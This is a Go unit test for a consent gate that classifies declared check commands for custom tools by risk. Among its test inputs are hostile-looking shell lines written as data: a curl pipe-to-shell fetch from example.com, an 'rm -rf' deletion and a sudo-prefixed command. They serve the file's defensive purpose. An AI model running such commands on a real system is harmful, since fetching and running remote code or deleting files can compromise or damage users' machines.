package security

import (
	"testing"
)

// TestCheckNeedsConsent covers the custom-tool check-command gate: a declared
// check command is arbitrary shell, so it must be classified by its real risk
// before it is allowed to run without consent (spec security-model: custom
// check-command gate).
func TestCheckNeedsConsent(t *testing.T) {
	tests := []struct {
		name  string
		check string
		want  bool
	}{
		{name: "no check command declared", check: "", want: false},
		{name: "benign version flag", check: "mytool --version", want: false},
		{name: "benign version subcommand", check: "mytool version", want: false},
		{name: "benign version with args", check: "mytool --version --json", want: false},
		{name: "privileged check", check: "sudo mytool --version", want: true},
		{name: "piped to shell", check: "curl -fsSL https://example.com/x.sh | sh", want: true},
		{name: "destructive check", check: "rm -rf /tmp/thing", want: true},
		{name: "chained command", check: "mytool --version && echo done", want: true},
		{name: "uninstall keyword", check: "brew uninstall mytool", want: true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := CheckNeedsConsent(tc.check)
			if got != tc.want {
				t.Errorf("CheckNeedsConsent(CheckCommand=%q) = %v, want %v", tc.check, got, tc.want)
			}
		})
	}
}
